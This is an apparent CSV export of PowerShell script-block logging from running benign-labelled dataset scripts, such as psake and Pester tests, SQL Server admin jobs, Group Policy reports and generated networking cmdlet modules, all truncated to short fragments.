"8/6/2026 9:26:28 AM","C:\TA\project-ta\data_spliting\test_set\benign\2900.ps1","376","Properties {; [string]$testProperty = ""Test123""; }; BuildSetup {; [string]$expected = ""Test123""; if ($testProperty -ne $expected) {; throw ""Expected sequence '$expected', but was actually '$testProper"
"8/6/2026 9:26:21 AM","","9","$global:?"
"8/6/2026 9:26:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:26:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:26:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:26:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:26:21 AM","C:\TA\project-ta\data_spliting\test_set\benign\2897.ps1","471","properties {; $container = @{}; $container.foo = ""foo""; $container.bar = $null; $foo = 1; $bar = 1; }; task default -depends TestInit; task TestInit {; Assert ($container.foo -eq ""foo"") ""$container.fo"
"8/6/2026 9:26:13 AM","","9","$global:?"
"8/6/2026 9:26:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:26:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:26:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:26:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:26:13 AM","C:\TA\project-ta\data_spliting\test_set\benign\2891.ps1","248","Task default -Depends RunWhatIf; Task RunWhatIf {; try {; $global:WhatIfPreference = $true; $parameters = @{p1='whatifcheck';}; Invoke-psake .\nested\whatifpreference.ps1 -parameters $parameters; } fi"
"8/6/2026 9:26:05 AM","","9","$global:?"
"8/6/2026 9:26:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:26:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:26:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:26:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:26:04 AM","C:\TA\project-ta\data_spliting\test_set\benign\2885.ps1","215","Framework '4.7'; task default -depends MsBuild; task MsBuild {; if ( $IsMacOS -OR $IsLinux ) {}; else {; $output = &msbuild /version /nologo 2>&1; Assert ($output -NotLike '15.0') '$output should cont"
"8/6/2026 9:25:57 AM","","9","$global:?"
"8/6/2026 9:25:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:25:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:25:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:25:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:25:56 AM","C:\TA\project-ta\data_spliting\test_set\benign\2865.ps1","230","task default -depends test; task test {; Push-Location 'missing_build_file'; $result = invoke-psake -Docs | Out-String; Pop-Location; Assert ($result -match 'adefaulttask') 'Default build file should "
"8/6/2026 9:25:49 AM","","9","$global:?"
"8/6/2026 9:25:49 AM","C:\TA\project-ta\data_spliting\test_set\benign\2816.ps1","54","{ $_.StartMode -eq ""Auto"" -or $_.State -eq ""Running"" }"
"8/6/2026 9:25:49 AM","C:\TA\project-ta\data_spliting\test_set\benign\2816.ps1","153","; $data = $null; foreach ($file in (ls *svcall.xml)) {; $data += Import-Clixml $file; }; $data | ? { $_.StartMode -eq ""Auto"" -or $_.State -eq ""Running"" }"
"8/6/2026 9:25:41 AM","C:\TA\project-ta\data_spliting\test_set\benign\2758.ps1","96","; Update-TypeData -TypeName System.Diagnostics.Process -SerializationDepth 3 -Force; Get-Process"
"8/6/2026 9:25:34 AM","","8026","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:25:34 AM","","10068","eterSetName='ByName')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetRoute.AddressFamily[]]
    ${AddressFamily},

    [Parameter(ParameterSetName='ByName')]
"
"8/6/2026 9:25:34 AM","","13662","re', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('IncludeAllCompartments') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOpt"
"8/6/2026 9:25:34 AM","","13662","
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
       "
"8/6/2026 9:25:34 AM","","13662","ization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Preferre"
"8/6/2026 9:25:34 AM","","13662","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:25:34 AM","","5289","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:25:34 AM","","2428","ue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('PacketCoalescingFilter')) {
            [object]$__cmdletization_value = $"
"8/6/2026 9:25:34 AM","","18122","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:25:34 AM","","4983","micParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = "
"8/6/2026 9:25:34 AM","","18122","ectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_NetNeighbor.cdxml-Help.xml
}
Microsoft.PowerShell"
"8/6/2026 9:25:34 AM","","18122","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:25:33 AM","","2734"," Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RegenerateTim"
"8/6/2026 9:25:33 AM","","19758","odelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
       "
"8/6/2026 9:25:33 AM","","19758","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:25:33 AM","","16532","me = 'DefaultHopLimit'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmd"
"8/6/2026 9:25:33 AM","","17806","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:25:33 AM","","9265","n_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AdvertisedRouterLifetime')) {
            [object]$__cmdletiza"
"8/6/2026 9:25:33 AM","","12266","= 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NlMtu'"
"8/6/2026 9:25:33 AM","","12266","{ClampMss},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetIPInterface.Advertising]
"
"8/6/2026 9:25:33 AM","","12266","ByProperty('Advertising', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('NlMtuBytes') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        "
"8/6/2026 9:25:33 AM","","12266","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:25:33 AM","","68","-ModuleMember -Function 'Remove-NetIPAddress' -Alias '*'
        
"
"8/6/2026 9:25:33 AM","","14775","
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('ValidLifetime')) {
        "
"8/6/2026 9:25:33 AM","","14775","ters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
  "
"8/6/2026 9:25:33 AM","","14775","terType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        $__cmdletizati"
"8/6/2026 9:25:33 AM","","14775","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:25:33 AM","","4573","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/StandardCimv2/"
"8/6/2026 9:25:33 AM","C:\TA\project-ta\data_spliting\test_set\benign\2747.ps1","14","; Get-NetRoute"
"8/6/2026 9:25:26 AM","","9","$global:?"
"8/6/2026 9:25:25 AM","C:\TA\project-ta\data_spliting\test_set\benign\2729.ps1","229","$ErrorActionPreference = ""SilentlyContinue""; $o = """" | Select-Object IISInstalled; if ((Get-ItemProperty HKLM:\Software\Microsoft\InetStp\Components\).W3SVC) {; $o.IISInstalled = ""True""; } else {; $o."
"8/6/2026 9:25:18 AM","","9","$global:?"
"8/6/2026 9:25:18 AM","C:\TA\project-ta\data_spliting\test_set\benign\2725.ps1","80","{; $obj | Add-Member NoteProperty .NET_$i $_.VersionInfo.ProductVersion; $i++; }"
"8/6/2026 9:25:18 AM","C:\TA\project-ta\data_spliting\test_set\benign\2725.ps1","352","; $obj = """" | Select-Object $($PSVersionTable.Keys); foreach($item in $PSVersionTable.Keys) {; $obj.$item = $($PSVersionTable[$item] -join "".""); }; $i = 1; Get-ChildItem -Force ""$($env:windir)\Microso"
"8/6/2026 9:25:10 AM","","9","$global:?"
"8/6/2026 9:25:10 AM","C:\TA\project-ta\data_spliting\test_set\benign\2723.ps1","88","Get-WmiObject -Namespace root\Microsoft\SecurityClient -Class AntimalwareInfectionStatus"
"8/6/2026 9:25:03 AM","","9","$global:?"
"8/6/2026 9:25:03 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:25:03 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:25:03 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:25:03 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:25:03 AM","C:\TA\project-ta\data_spliting\test_set\benign\2722.ps1","319","if (Test-Path ""$env:SystemRoot\clrver.exe"") {; $counter = 0; & $env:SystemRoot\clrver.exe -all 2> $null | `; ConvertFrom-Csv -Delimiter `t -Header ""PID"",""ProcessName"",""CLR Version"" | `; ForEach-Object"
"8/6/2026 9:24:55 AM","C:\TA\project-ta\data_spliting\test_set\benign\2720.ps1","263","; $ErrorActionPreference = ""Continue""; Try {; Push-Location; Set-Location Cert:; ls -r * | Select-Object PSParentPath,FriendlyName,NotAfter,NotBefore,SerialNumber,Thumbprint,Issuer,Subject; } Catch {;"
"8/6/2026 9:24:47 AM","","9","$global:?"
"8/6/2026 9:24:47 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:24:47 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:24:47 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:24:47 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:24:47 AM","C:\TA\project-ta\data_spliting\test_set\benign\2641.ps1","609","$dbs = Invoke-Sqlcmd -ServerInstance localhost -Database tempdb -Query ""SELECT name FROM sys.databases WHERE database_id != 2 and state_desc = 'ONLINE'""; $datestring =  (Get-Date -Format 'yyyyMMddHHmm"
"8/6/2026 9:24:39 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:24:39 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:24:39 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:24:39 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:24:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\2639.ps1","1196","param([string] $ServerInstance); $smosrv = New-Object Microsoft.SqlServer.Management.Smo.Server $ServerInstance; $jobs = @('BackupDBs-FULL','BackupDBs-LOGS'); foreach($job in $jobs){; $j = New-Object "
"8/6/2026 9:24:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\2622.ps1","33","{$_.Class -eq 'DomainController'}"
"8/6/2026 9:24:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:24:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:24:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:24:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:24:30 AM","C:\TA\project-ta\data_spliting\test_set\benign\2622.ps1","1208","Import-Module C:\git-repositories\PowerShell\MSFVMLab\MSFVMLab.psm1 -Force; $LabConfig = Get-Content C:\git-repositories\PowerShell\MSFVMLab\LabVMS.json | ConvertFrom-Json; $WorkingDirectory = $LabCon"
"8/6/2026 9:24:23 AM","","9","$global:?"
"8/6/2026 9:24:23 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:24:23 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:24:23 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:24:23 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:24:23 AM","C:\TA\project-ta\data_spliting\test_set\benign\2600.ps1","984","[System.Reflection.Assembly]::LoadWithPartialName(""Microsoft.SqlServr.Rmo""); $servername = ""STGSQL610""; $repserver = New-Object ""Microsoft.SqlServer.Replication.ReplicationServer""; $srv = New-Object """
"8/6/2026 9:24:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\2569.ps1","1323","$Database = ""dbamaint""; $Server = ""PSQLPA24""; $SMTPServer = ""smtp.domain.com""; $AttachmentPath = ""C:\Dexma\Logs\output.csv""; $SqlQuery = ""exec sel_TRNSizing""; $SqlConnection = New-Object System.Data.S"
"8/6/2026 9:24:07 AM","","9","$global:?"
"8/6/2026 9:24:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:24:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:24:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:24:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:24:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\2542.ps1","520","$a = ""XSQLUTIL18"", ""XSQLUTIL19""; $a | % `; {; $ServerName = $_;; cd sqlserver:\; cd sql\$ServerName\default\databases; $DBs = dir;; $DBs | % `; {; $LastBackupDate = $_.LastBackupDate;; $LastLogBackupD"
"8/6/2026 9:23:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\2535.ps1","1166","; $LastDayOfMonth = (Get-Date -Year (Get-Date).Year -Month (Get-Date).Month -Day 1 -DisplayHint Date).AddMonths(1).AddDays(-1); Write-Host ($lastDayOfMonth).Date; $DateDiff1 = New-TimeSpan $(Get-Date "
"8/6/2026 9:23:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:23:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:23:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:23:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:23:52 AM","C:\TA\project-ta\data_spliting\test_set\benign\2533.ps1","247","param($fileFilter=$(throw ""Filter must be specified"")); $regex = [regex]""^(?<Program>\S*)\s*pid: (?<PID>\d*)\s*type: (?<Handle>\S*)\s*\w*: (?<File>((\\\\).*|([a-zA-Z]:).*))""; E:\Dexma\bin\ThirdParty\h"
"8/6/2026 9:23:44 AM","","9","$global:?"
"8/6/2026 9:23:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:23:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:23:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:23:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:23:44 AM","C:\TA\project-ta\data_spliting\test_set\benign\2367.ps1","852","$aOutput = @();; $aDisabledGpos = Get-GPO -All | Where-Object { $_.GpoStatus -eq 'AllSettingsDisabled' };; foreach ($oGpo in $aDisabledGpos) {; $oOutput = New-Object System.Object;; $oOutput | Add-Mem"
"8/6/2026 9:23:36 AM","","9","$global:?"
"8/6/2026 9:23:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:23:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:23:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:23:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:23:36 AM","C:\TA\project-ta\data_spliting\test_set\benign\2352.ps1","871","Import-Module ActiveDirectory; try {; $uap_docs = Import-Csv C:\scripts\All-Doc-2013-Password-Policy\all-docs-2013-password-policy.csv; $ad_pw_ages = @();; foreach ($user in $uap_docs) {; $ad_pw_ages "
"8/6/2026 9:23:29 AM","","9","$global:?"
"8/6/2026 9:23:29 AM","C:\TA\project-ta\data_spliting\test_set\benign\2339.ps1","59","{$_.Category -like 'Windows Components/Internet Explorer*'}"
"8/6/2026 9:23:29 AM","C:\TA\project-ta\data_spliting\test_set\benign\2339.ps1","26","{ $_.Name -eq 'Registry' }"
"8/6/2026 9:23:29 AM","C:\TA\project-ta\data_spliting\test_set\benign\2339.ps1","32","{$_.Name -eq 'Internet Options'}"
"8/6/2026 9:23:29 AM","C:\TA\project-ta\data_spliting\test_set\benign\2339.ps1","24","{$_.Name -eq 'Registry'}"
"8/6/2026 9:23:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:23:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:23:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:23:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:23:28 AM","C:\TA\project-ta\data_spliting\test_set\benign\2339.ps1","3191","[xml]$golden_gpo = gc '.\IE Settings.xml'; $gpos = Get-GPOReport -All -ReportType XML; $golden_gpo_computer_registry_settings = ($golden_gpo.GPO.Computer.ExtensionData | ? {$_.Name -eq 'Registry'}).ch"
"8/6/2026 9:23:20 AM","C:\TA\project-ta\data_spliting\test_set\benign\2145.ps1","882","Describe 'Automatic variable $input' -Tags ""CI"" {; It '$input Type should be enumerator' -Skip {; function from_begin { [cmdletbinding()]param() begin { Write-Output -NoEnumerate $input } }; function "
"8/6/2026 9:23:12 AM","C:\TA\project-ta\data_spliting\test_set\benign\2136.ps1","7608","Describe ""Range Operator"" -Tags CI {; Context ""Range integer operations"" {; It ""Range operator generates arrays of integers"" {; $Range = 5..8; $Range.count | Should -Be 4; $Range[0] | Should -BeOfType"
"8/6/2026 9:23:04 AM","C:\TA\project-ta\data_spliting\test_set\benign\2125.ps1","1172","Describe ""Test trap"" -Tags ""CI"" {; Context ""Trap with flow control"" {; It ""Line after exception should NOT be continued when it's from a nested script block"" {; $a = . {trap {""trapped""; continue;}; . "
"8/6/2026 9:22:56 AM","C:\TA\project-ta\data_spliting\test_set\benign\2110.ps1","4599","Describe ""ArrayExpression Tests"" -Tags ""CI"" {; It ""@([object[]](1,2,3)) should return a 3-element array of object[]"" {; $result = @([object[]](1,2,3)); $result.GetType().FullName | Should -BeExactly """
"8/6/2026 9:22:48 AM","C:\TA\project-ta\data_spliting\test_set\benign\2064.ps1","4023","Describe ""Language Primitive Tests"" -Tags ""CI"" {; It ""Equality comparison with string and non-numeric type should not be culture sensitive"" {; $date = [datetime]'2005,3,10'; $val = [System.Management."
"8/6/2026 9:22:40 AM","","9","$global:?"
"8/6/2026 9:22:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:22:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:22:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:22:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:22:40 AM","C:\TA\project-ta\data_spliting\test_set\benign\2051.ps1","3164","try {; $defaultParamValues = $PSdefaultParameterValues.Clone(); $PSDefaultParameterValues[""it:skip""] = ![System.Management.Automation.Platform]::IsWindowsDesktop; Describe 'Basic COM Tests' -Tags ""CI"""
"8/6/2026 9:22:32 AM","C:\TA\project-ta\data_spliting\test_set\benign\2044.ps1","4607","Describe ""Telemetry for shell startup"" -Tag CI {; BeforeAll {; $cacheDir = [System.Management.Automation.Platform].GetField(""CacheDirectory"",""NonPublic,Static"").GetValue($null); $uuidPath = Join-Path "
"8/6/2026 9:22:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:22:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:22:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:22:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:22:24 AM","C:\TA\project-ta\data_spliting\test_set\benign\2016.ps1","209",". ""$psscriptroot/TestRunner.ps1""; $AssemblyName = ""Microsoft.PowerShell.ConsoleHost""; $excludeList = @(""HostMshSnapinResources.resx""); Test-ResourceStrings -AssemblyName $AssemblyName -ExcludeList $ex"
"8/6/2026 9:22:16 AM","C:\TA\project-ta\data_spliting\test_set\benign\1984.ps1","861","Describe ""New-Event"" -Tags ""CI"" {; Context ""Check return type of New-Event"" {; It ""Should return PSEventArgs as return type of New-Event"" {; New-Event -SourceIdentifier a | Should -BeOfType System.Man"
"8/6/2026 9:22:08 AM","C:\TA\project-ta\data_spliting\test_set\benign\1972.ps1","1664","Describe ""Remove-PSBreakpoint"" -Tags ""CI"" {; $testScript = Join-Path -Path (Join-Path -Path $PSScriptRoot -ChildPath assets) -ChildPath psbreakpointtestscript.ps1; $script = ""`$var = 1; `$var2 = Get-C"
"8/6/2026 9:22:00 AM","C:\TA\project-ta\data_spliting\test_set\benign\1938.ps1","773","Describe ""Measure-Command"" -Tags ""CI"" {; Context ""Validate return types for Measure-Command"" {; It ""Should return TimeSpan as the return type"" {; Measure-Command { Get-Date } | Should -BeOfType timesp"
"8/6/2026 9:21:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:21:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:21:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:21:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:21:52 AM","C:\TA\project-ta\data_spliting\test_set\benign\1929.ps1","692","Import-Module HelpersCommon; Describe ""Set-Date for admin"" -Tag @('CI', 'RequireAdminOnWindows', 'RequireSudoOnUnix') {; It ""Set-Date should be able to set the date in an elevated context"" -Skip:(Test"
"8/6/2026 9:21:44 AM","C:\TA\project-ta\data_spliting\test_set\benign\1924.ps1","7608","Describe ""Set-Variable DRT Unit Tests"" -Tags ""CI"" {; It ""Set-Variable normal variable Name should works""{; Set-Variable foo bar; $var1=Get-Variable -Name foo; $var1.Name|Should -BeExactly ""foo""; $var1"
"8/6/2026 9:21:36 AM","C:\TA\project-ta\data_spliting\test_set\benign\1920.ps1","1411","Describe ""Get-Runspace cmdlet tests"" -Tag ""CI"" {; BeforeAll {; $CurrentRunspace = $ExecutionContext.Host.Runspace; $ExpectedInstanceId = $CurrentRunspace.InstanceId; $ExpectedId = $currentRunspace.Id;"
"8/6/2026 9:21:28 AM","C:\TA\project-ta\data_spliting\test_set\benign\1905.ps1","740","Describe ""Get-FormatData"" -Tags ""CI"" {; Context ""Check return type of Get-FormatData"" {; It ""Should return an object[] as the return type"" {; $result = Get-FormatData; ,$result | Should -BeOfType ""Sys"
"8/6/2026 9:21:20 AM","C:\TA\project-ta\data_spliting\test_set\benign\1873.ps1","588","Describe ""New-TemporaryFile"" -Tags ""CI"" {; It ""creates a new temporary file"" {; $tempFile = New-TemporaryFile; $tempFile | Should -Exist; $tempFile | Should -BeOfType System.IO.FileInfo; $tempFile | S"
"8/6/2026 9:21:12 AM","C:\TA\project-ta\data_spliting\test_set\benign\1870.ps1","2493","Describe ""PSReadLine"" -tags ""CI"" {; BeforeAll {; if (Get-Module PSReadLine) {; $originalEditMode = (Get-PSReadLineOption).EditMode; Remove-Module PSReadLine; }; }; It ""Should import the module correct"
"8/6/2026 9:21:04 AM","C:\TA\project-ta\data_spliting\test_set\benign\1869.ps1","1280","Describe ""Get-PSHostProcessInfo tests"" -Tag CI {; BeforeAll {; $si = [System.Diagnostics.ProcessStartInfo]::new(); $si.FileName = ""pwsh""; $si.Arguments = ""-noexit""; $si.RedirectStandardInput = $true; "
"8/6/2026 9:20:55 AM","C:\TA\project-ta\data_spliting\test_set\benign\185.ps1","521","; $childWI_ReviewerActivityHasReviewers_Class_id = '6e05d202-38a4-812e-34b8-b11642001a80'; $childWI_ReviewerActivityHasReviewers_Class_obj = Get-SCSMRelationshipClass -id $childWI_ReviewerActivityHasR"
"8/6/2026 9:20:48 AM","","97","Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","105","Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","99","Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","102","Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","99","Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","112","Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","110","Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","101","Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","103","Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","101","Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","100","Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:48 AM","","100","Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
